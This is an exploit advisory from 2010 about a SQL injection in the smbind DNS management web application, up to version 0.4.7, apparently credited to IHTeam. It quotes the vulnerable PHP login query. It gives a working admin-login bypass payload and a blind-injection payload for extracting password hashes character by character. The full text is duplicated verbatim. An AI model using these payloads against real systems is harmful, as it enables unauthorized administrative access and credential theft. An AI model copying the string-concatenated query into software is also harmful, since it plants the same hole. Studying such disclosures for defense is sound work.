smbind <= v.0.4.7 Sql Injection Vulnerability
=============================================


##############################################################################################
#
# smbind <= v.0.4.7 Sql Injection
# Site: https://sourceforge.net/projects/smbind/files/
# Reported on 28/08/2010
#
# Author: IHTeam
#
##############################################################################################
#
# Buggy code:
#
if(isset($_POST[&#039;username&#039;]) && isset($_POST[&#039;password&#039;])) {
        if((!filter("alphanum", $_POST[&#039;username&#039;])) or (!filter("alphanum", $_POST[&#039;password&#039;]))) {
                die("Username and password must contain only letters and numbers.");
        }
        $_SESSION[&#039;username&#039;] = $_POST[&#039;username&#039;];
        $_SESSION[&#039;password&#039;] = $_POST[&#039;password&#039;];
}
 
if(isset($_SESSION[&#039;username&#039;]) && isset($_SESSION[&#039;password&#039;])) {
        $res = $dbconnect->query("SELECT ID FROM users WHERE username = &#039;" . $_SESSION[&#039;username&#039;] ."&#039; AND password = &#039;" . md5($_SESSION[&#039;password&#039;]) . " &#039; ");
#
##############################################################################################
#
# Easy admin login
#
# Enter in username field: admin&#039;; #
# Enter in password field: [anything]
#
# Sql query will result like this: SELECT ID FROM users WHERE username = &#039;admin&#039;; #&#039; AND password = &#039;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#039;
#
##############################################################################################
#
# Limitation and Blind Sql Injection
#
# You&#039;re able to make blind sql injection too. Just input in username field something like this:
# admin&#039; AND SUBSTRING(password,1,1)=char(49); #
#
# That sql injection work only with magic_quote_gpc = Off
#
##############################################################################################


##############################################################################################
#
# smbind <= v.0.4.7 Sql Injection
# Site: https://sourceforge.net/projects/smbind/files/
# Reported on 28/08/2010
#
# Author: IHTeam
#
##############################################################################################
#
# Buggy code:
#
if(isset($_POST[&#039;username&#039;]) && isset($_POST[&#039;password&#039;])) {
        if((!filter("alphanum", $_POST[&#039;username&#039;])) or (!filter("alphanum", $_POST[&#039;password&#039;]))) {
                die("Username and password must contain only letters and numbers.");
        }
        $_SESSION[&#039;username&#039;] = $_POST[&#039;username&#039;];
        $_SESSION[&#039;password&#039;] = $_POST[&#039;password&#039;];
}
 
if(isset($_SESSION[&#039;username&#039;]) && isset($_SESSION[&#039;password&#039;])) {
        $res = $dbconnect->query("SELECT ID FROM users WHERE username = &#039;" . $_SESSION[&#039;username&#039;] ."&#039; AND password = &#039;" . md5($_SESSION[&#039;password&#039;]) . " &#039; ");
#
##############################################################################################
#
# Easy admin login
#
# Enter in username field: admin&#039;; #
# Enter in password field: [anything]
#
# Sql query will result like this: SELECT ID FROM users WHERE username = &#039;admin&#039;; #&#039; AND password = &#039;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#039;
#
##############################################################################################
#
# Limitation and Blind Sql Injection
#
# You&#039;re able to make blind sql injection too. Just input in username field something like this:
# admin&#039; AND SUBSTRING(password,1,1)=char(49); #
#
# That sql injection work only with magic_quote_gpc = Off
#
##############################################################################################



